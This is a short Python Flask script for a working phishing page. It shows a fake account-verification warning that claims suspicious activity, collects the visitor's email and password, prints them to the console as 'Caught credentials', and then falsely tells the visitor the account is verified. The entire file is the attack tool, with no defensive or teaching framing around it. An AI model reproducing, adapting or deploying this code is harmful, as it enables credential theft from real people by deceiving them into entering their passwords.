from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/')
def index():
    return render_template_string("""
    <h2>Your Account Needs Verification!</h2>
    <p>We detected suspicious activity. Please log in to verify your account.</p>
    <form action="/submit" method="POST">
        Email: <input name="email" type="email"><br>
        Password: <input name="password" type="password"><br>
        <input type="submit" value="Verify Now">
    </form>
    """)

@app.route('/submit', methods=['POST'])
def submit():
    email = request.form.get('email')
    password = request.form.get('password')
    print(f"[!] Caught credentials → Email: {email} | Password: {password}")
    return "<h3>Thank you! Your account is verified.</h3>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
